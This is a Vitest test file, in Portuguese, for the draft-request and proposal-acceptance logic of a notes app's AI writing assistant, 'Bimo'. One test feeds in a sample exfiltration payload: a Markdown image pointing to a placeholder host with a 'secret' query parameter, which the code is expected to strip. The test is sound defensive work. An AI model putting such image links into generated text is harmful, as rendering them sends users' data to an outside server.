import { describe, expect, it } from "vitest";
import { LIMITES_DO_RASCUNHO, montarPedido, planejarAceite } from "./pedido-de-rascunho";

import { TAMANHO_MAXIMO_DO_ANTES, TAMANHO_MAXIMO_DO_DEPOIS, TAMANHO_MAXIMO_DO_TITULO, TAMANHO_MAXIMO_DO_TRECHO } from "../validacao-do-rascunho";

const aplicar = (texto: string, edicao: { de: number; ate: number; texto: string }) => texto.slice(0, edicao.de) + edicao.texto + texto.slice(edicao.ate);

it("os limites do cliente são os do servidor (senão o pedido seria recusado com 400)", () => {
  expect(LIMITES_DO_RASCUNHO).toEqual({ antes: TAMANHO_MAXIMO_DO_ANTES, depois: TAMANHO_MAXIMO_DO_DEPOIS, trecho: TAMANHO_MAXIMO_DO_TRECHO, titulo: TAMANHO_MAXIMO_DO_TITULO });
});

describe("montarPedido", () => {
  it("continuar: manda o que vem antes do cursor (cortado nos limites) e um pouco do que vem depois", () => {
    const texto = "a".repeat(5000) + "|" + "b".repeat(3000);
    const resultado = montarPedido({ acao: "continuar", texto, inicio: 5001, fim: 5001, titulo: "  Nota  " });
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(resultado.pedido.acao).toBe("continuar");
    expect(resultado.pedido.titulo).toBe("Nota");
    expect(resultado.pedido.trecho).toBe("");
    expect(resultado.pedido.antes).toHaveLength(LIMITES_DO_RASCUNHO.antes);
    expect(resultado.pedido.antes.endsWith("|")).toBe(true);
    expect(resultado.pedido.depois).toHaveLength(LIMITES_DO_RASCUNHO.depois);
  });
  it("continuar sem texto antes do cursor explica o que falta", () => {
    expect(montarPedido({ acao: "continuar", texto: "   \n", inicio: 4, fim: 4, titulo: "N" })).toEqual({ ok: false, motivo: "Escreva algo antes do cursor para o Bimo continuar." });
  });
  it("resumir e melhorar usam a seleção como trecho", () => {
    const resultado = montarPedido({ acao: "melhorar", texto: "início. trecho aqui. fim.", inicio: 8, fim: 19, titulo: "N" });
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(resultado.pedido).toMatchObject({ acao: "melhorar", trecho: "trecho aqui", antes: "início. ", depois: ". fim." });
  });
  it("sem seleção (ou só espaços) pede para selecionar", () => {
    expect(montarPedido({ acao: "resumir", texto: "texto", inicio: 2, fim: 2, titulo: "N" })).toEqual({ ok: false, motivo: "Selecione um trecho do texto para o Bimo resumir." });
    expect(montarPedido({ acao: "melhorar", texto: "a   b", inicio: 1, fim: 4, titulo: "N" })).toEqual({ ok: false, motivo: "Selecione um trecho do texto para o Bimo melhorar." });
  });
  it("seleção acima do limite pede um trecho menor", () => {
    const texto = "x".repeat(LIMITES_DO_RASCUNHO.trecho + 1);
    expect(montarPedido({ acao: "resumir", texto, inicio: 0, fim: texto.length, titulo: "N" })).toEqual({ ok: false, motivo: "Selecione um trecho menor (até 8.000 caracteres)." });
  });
});

describe("planejarAceite", () => {
  const pedir = (acao: "continuar" | "resumir" | "melhorar", texto: string, inicio: number, fim: number) => {
    const resultado = montarPedido({ acao, texto, inicio, fim, titulo: "N" });
    if (!resultado.ok) throw new Error(resultado.motivo);
    return resultado.ancora;
  };

  it("continuar insere no cursor, com um espaço se a frase não terminava em espaço", () => {
    const texto = "Primeira frase";
    const ancora = pedir("continuar", texto, texto.length, texto.length);
    const resultado = planejarAceite(ancora, texto, "e a segunda.");
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(aplicar(texto, resultado.edicao)).toBe("Primeira frase e a segunda.");
    expect(resultado.edicao.cursor).toBe("Primeira frase e a segunda.".length);
  });
  it("continuar depois de espaço, quebra de linha ou pontuação não acrescenta espaço duplicado", () => {
    for (const [texto, proposta, esperado] of [["Frase ", "seguinte", "Frase seguinte"], ["Frase\n", "Outra", "Frase\nOutra"], ["Frase", ", e mais", "Frase, e mais"], ["Frase", "\n\nNovo parágrafo", "Frase\n\nNovo parágrafo"]] as const) {
      const ancora = pedir("continuar", texto, texto.length, texto.length);
      const resultado = planejarAceite(ancora, texto, proposta);
      if (!resultado.ok) throw new Error(resultado.motivo);
      expect(aplicar(texto, resultado.edicao)).toBe(esperado);
    }
  });
  it("continuar no meio do texto preserva o que vem depois", () => {
    const texto = "Antes| depois";
    const ancora = pedir("continuar", texto, 6, 6);
    const resultado = planejarAceite(ancora, texto, "meio");
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(aplicar(texto, resultado.edicao)).toBe("Antes| meio depois");
  });
  it("melhorar troca a seleção e preserva o espaço ao redor dela", () => {
    const texto = "um  trecho ruim  fim";
    const ancora = pedir("melhorar", texto, 2, 16);
    const resultado = planejarAceite(ancora, texto, "  Um trecho melhor.\n");
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(aplicar(texto, resultado.edicao)).toBe("um  Um trecho melhor.  fim");
  });
  it("resumir acrescenta o resumo depois da seleção, em outro parágrafo, sem apagar nada", () => {
    const texto = "Um texto longo. Segue mais.";
    const ancora = pedir("resumir", texto, 0, 15);
    const resultado = planejarAceite(ancora, texto, "  Resumo curto. ");
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(aplicar(texto, resultado.edicao)).toBe("Um texto longo.\n\nResumo curto.\n\n Segue mais.");
  });
  it("resumir no fim do texto não deixa linhas sobrando", () => {
    const texto = "Um texto longo.";
    const resultado = planejarAceite(pedir("resumir", texto, 0, texto.length), texto, "Resumo.");
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(aplicar(texto, resultado.edicao)).toBe("Um texto longo.\n\nResumo.");
  });
  it("recusa se o texto mudou onde a âncora estava (nunca insere no lugar errado)", () => {
    const texto = "Primeira frase";
    const continuar = pedir("continuar", texto, texto.length, texto.length);
    expect(planejarAceite(continuar, "Outra coisa agora", "x")).toEqual({ ok: false, motivo: "O texto mudou depois do pedido. Peça de novo." });
    const melhorar = pedir("melhorar", "um trecho aqui", 3, 9);
    expect(planejarAceite(melhorar, "um trecha aqui", "novo")).toEqual({ ok: false, motivo: "O texto mudou depois do pedido. Peça de novo." });
    expect(planejarAceite(melhorar, "curto", "novo")).toEqual({ ok: false, motivo: "O texto mudou depois do pedido. Peça de novo." });
  });
  it("continuar também confere o que vem DEPOIS do cursor: digitar ali durante o pedido invalida o aceite", () => {
    const ancora = pedir("continuar", "Hello", 5, 5);
    expect(planejarAceite(ancora, "Hello world", "e a segunda.")).toEqual({ ok: false, motivo: "O texto mudou depois do pedido. Peça de novo." });
    expect(planejarAceite(ancora, "Hello", "e a segunda.").ok).toBe(true);
  });
  it("melhorar e resumir também recusam se o texto depois da seleção mudou", () => {
    const melhorar = pedir("melhorar", "um trecho aqui", 3, 9);
    expect(planejarAceite(melhorar, "um trecho aqui agora", "x").ok).toBe(false);
    const resumir = pedir("resumir", "Texto longo. Fim.", 0, 12);
    expect(planejarAceite(resumir, "Texto longo. Fim!", "x").ok).toBe(false);
  });
  it("resumir cola o resumo na linha seguinte sem fundi-la (um \\n vira parágrafo à parte)", () => {
    const texto = "Primeiro.\nSegundo.";
    const resultado = planejarAceite(pedir("resumir", texto, 0, 9), texto, "Resumo.");
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(aplicar(texto, resultado.edicao)).toBe("Primeiro.\n\nResumo.\n\nSegundo.");
    const duplo = "Primeiro.\n\nSegundo.";
    const resultadoDuplo = planejarAceite(pedir("resumir", duplo, 0, 9), duplo, "Resumo.");
    if (!resultadoDuplo.ok) throw new Error(resultadoDuplo.motivo);
    expect(aplicar(duplo, resultadoDuplo.edicao)).toBe("Primeiro.\n\nResumo.\n\nSegundo.");
  });
  it("normaliza \\r\\n da proposta (o campo só tem \\n) para o cursor cair certo", () => {
    const resultado = planejarAceite(pedir("continuar", "Texto\n", 6, 6), "Texto\n", "linha 1\r\nlinha 2");
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(resultado.edicao.texto).toBe("linha 1\nlinha 2");
    expect(resultado.edicao.cursor).toBe(6 + "linha 1\nlinha 2".length);
  });
  it("a proposta nunca leva imagem Markdown (seria um pedido de rede ao renderizar a nota)", () => {
    const resultado = planejarAceite(pedir("continuar", "Texto ", 6, 6), "Texto ", "veja ![logo](https://x.exemplo/?d=segredo) e ![ref][1]\n\n[1]: https://x.exemplo/a.png");
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(resultado.edicao.texto).not.toMatch(/!\[/);
    expect(resultado.edicao.texto).toContain("logo");
  });
  it("não parte um emoji ao meio ao cortar o contexto", () => {
    const texto = "😀".repeat(2500) + "|" + "😀".repeat(1500);
    const resultado = montarPedido({ acao: "continuar", texto, inicio: 5001, fim: 5001, titulo: "N" });
    if (!resultado.ok) throw new Error(resultado.motivo);
    expect(resultado.pedido.antes).not.toMatch(/^[\uDC00-\uDFFF]/);
    expect(resultado.pedido.depois).not.toMatch(/[\uD800-\uDBFF]$/);
  });
  it("recusa uma proposta vazia", () => {
    const ancora = pedir("continuar", "texto", 5, 5);
    expect(planejarAceite(ancora, "texto", "   \n")).toEqual({ ok: false, motivo: "O Bimo não devolveu texto. Tente de novo." });
  });
});
